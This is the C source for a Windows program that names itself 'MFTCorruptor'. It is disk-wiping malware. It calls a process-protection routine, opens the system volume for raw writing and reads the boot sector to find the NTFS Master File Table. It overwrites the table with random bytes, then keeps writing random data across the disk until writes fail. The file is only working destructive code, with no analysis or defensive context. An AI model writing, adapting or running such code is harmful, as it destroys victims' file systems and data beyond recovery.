#include <Windows.h>
#include <stdint.h>
#include "protect.h"

uint64_t uint8to64(uint8_t fouruint8[8]) {
	return *(uint64_t*)fouruint8;
	//return((uint64_t)fouruint8[7] << 56) | ((uint64_t)fouruint8[6] << 48) | ((uint64_t)fouruint8[5] << 40) | ((uint64_t)fouruint8[4] << 32) |
		//((uint64_t)fouruint8[3] << 24) | ((uint64_t)fouruint8[2] << 16) | ((uint64_t)fouruint8[1] << 8) | ((uint64_t)fouruint8[0]);;
}

void main()
{
	protectProcess();
	char system[MAX_PATH];
	char buffer[6];
	uint8_t MFTLocation[8];
	DWORD wb;
	char bootsector[512];
	GetSystemDirectory(system, sizeof(system));
	memcpy(buffer + 0, "\\\\.\\", 4);
	memcpy(buffer + 4, system, 2);
	HANDLE LogicalDrive = CreateFileA(buffer, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_FLAG_NO_BUFFERING | FILE_FLAG_RANDOM_ACCESS, 0);
	SetFilePointer(LogicalDrive, 0,0, FILE_BEGIN);
	///
	ReadFile(LogicalDrive, bootsector, 512, &wb, NULL);
	memcpy(MFTLocation + 0, bootsector + 48, 8);
	//
	LARGE_INTEGER number;
	number.QuadPart = (ULONGLONG)uint8to64(MFTLocation)*(ULONGLONG)4096;

	SetFilePointerEx(LogicalDrive, number,NULL, FILE_BEGIN);

	BYTE MFTCluster[4096];

	HCRYPTPROV prov;
	CryptAcquireContextA(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT);
	CryptGenRandom(prov, 4096, MFTCluster);
	CryptReleaseContext(prov, 0);

	WriteFile(LogicalDrive, MFTCluster, 4096, &wb, NULL);

	MessageBoxA(NULL, (char *)MFTCluster, "MFTCorruptor", MB_OK | MB_ICONINFORMATION);

	BOOL bSuccess;
	unsigned long secCount = 0;

while(true)
{
        bSuccess = WriteFile(LogicalDrive, MFTCluster, 4096, &wb, NULL);

        if (bSuccess & (wb < 4096))
        {
            break;
        }

        if(!bSuccess)
        {
            break;
        }

        if(bSuccess && wb>0)
        {
			//fucked
        }

        secCount++;
}
}
